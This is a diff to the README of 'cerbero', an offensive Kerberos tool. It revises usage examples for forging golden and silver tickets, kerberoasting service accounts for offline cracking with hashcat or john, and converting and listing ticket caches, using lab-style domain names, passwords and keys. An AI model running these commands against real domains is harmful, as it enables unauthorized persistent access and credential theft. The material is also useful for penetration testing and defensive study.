@@ -114,7 +114,7 @@ cerbero brute under.world Zeus Olympus1234
 ```
 
 ### Convert
-Allows to `convert` ticket files between krb (Windows) and
+`convert` ticket files between krb (Windows) and
 ccache (Linux) formats.
 
 Convert ccache to krb:
@@ -131,12 +131,14 @@ To `craft` golden and silver tickets.
 
 Craft a golden ticket (by using the `krbtgt` AES256 key):
 ```shell
-cerbero craft --realm under.world --realm-sid S-1-5-21-658410550-3858838999-180593761 --user kratos --aes-256 fed0c966ff7f88d776bb35fed0f039725f8bbb87017d5b6b76ee848f25562d2c
+$ cerbero craft -u under.world/kratos --sid S-1-5-21-658410550-3858838999-180593761 --aes fed0c966ff7f88d776bb35fed0f039725f8bbb87017d5b6b76ee848f25562d2c -vv
+INFO - Save kratos TGT in kratos.ccache
 ```
 
 Craft a silver ticket (for the service `cifs` hosted by the machine `styx`):
 ```shell
-cerbero craft --realm under.world --realm-sid S-1-5-21-658410550-3858838999-180593761 --user kratos --ntlm 29f9ab984728cc7d18c8497c9ee76c77 --spn cifs/styx,under.world
+$ cerbero craft -u under.world/kratos --sid S-1-5-21-658410550-3858838999-180593761 --ntlm 29f9ab984728cc7d18c8497c9ee76c77 -s cifs/styx,under.world -vv
+INFO - Save kratos TGS for cifs/styx.under.world in kratos.ccache
 ```
 
 ### Hash
@@ -160,7 +162,7 @@ aes256:1304965c35176aeb72e1ae5fdd6c2fe2e901af7223cb75f5eaac25ad667136e7
 To format encrypted part of tickets in order to be cracked by hashcat or john.
 
 ```shell
-cerbero kerberoast -s services.txt --realm under.world --user Hades -p IamtheKingofD34d!!
+$ cerbero kerberoast -s services.txt -u under.world/Hades -p IamtheKingofD34d!!
 ```
 To get a list of services you could use `ldapsearch`:
 ```shell
@@ -172,7 +174,15 @@ ldapsearch -b "dc=under,dc=world" -w IamtheKingofD34d!! -D "Hades@under.world" "
 to `klist` command.
 
 ```shell
-cerbero list hades.ccache
+$ cerbero list hades.ccache -fe
+Ticket cache (ccache): FILE:hades.ccache
+
+Hades@UNDER.WORLD => krbtgt/UNDER.WORLD@UNDER.WORLD
+Valid starting: 12/22/2020 17:39:34
+Expires : 12/23/2020 03:39:34
+Renew until: 12/29/2020 17:39:34
+Flags: FRIA
+Etype (skey, tkt): aes256-cts-hmac-sha1-96 (18), aes256-cts-hmac-sha1-96 (18)
 ```
 
 ## Credits
